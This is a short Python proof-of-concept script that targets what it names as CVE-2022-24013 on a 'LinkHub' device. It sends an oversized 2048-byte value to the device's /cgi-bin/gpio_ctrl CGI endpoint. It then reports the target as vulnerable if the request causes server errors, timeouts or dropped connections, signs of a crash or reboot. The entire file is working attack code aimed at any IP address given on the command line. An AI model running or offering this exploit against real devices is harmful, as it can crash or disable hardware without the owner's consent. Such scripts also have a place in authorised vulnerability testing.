import sys
import requests
import time

class LinkHubCVE202224013:
    def __init__(self, target_ip):
        self.target_ip = target_ip
        self.url = f"http://{self.target_ip}/cgi-bin/gpio_ctrl"
        self.timeout = 10

    def build_payload(self):
        """
       idk
        """
        return {
            "action": "GetValue",
            "config_value": "A" * 2048
        }

    def send_exploit(self):
        """
      idk
        """
        payload = self.build_payload()
        try:
            start = time.time()
            response = requests.post(self.url, data=payload, timeout=self.timeout)
            duration = time.time() - start

            if response.status_code == 200:
                body = response.text.lower()
                if "error" in body or "fault" in body:
                    return True, "Error indication in response body"
                return False, "No obvious error, manual review needed"

            elif response.status_code >= 500:
                return True, f"Server error {response.status_code} detected"

            else:
                return False, f"Unexpected HTTP status code {response.status_code}"

        except requests.exceptions.Timeout:
            return True, "Timeout occurred - possible crash"

        except requests.exceptions.ConnectionError:
            return True, "Connection error - possible reboot"

        except Exception as e:
            return False, f"Unexpected exception: {str(e)}"

def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    tester = LinkHubCVE202224013(target_ip)
    vulnerable, message = tester.send_exploit()

    if vulnerable:
        print(f"[VULNERABLE] Target {target_ip} is likely vulnerable: {message}")
    else:
        print(f"[NOT VULNERABLE] Target {target_ip}: {message}")

if __name__ == "__main__":
    main()

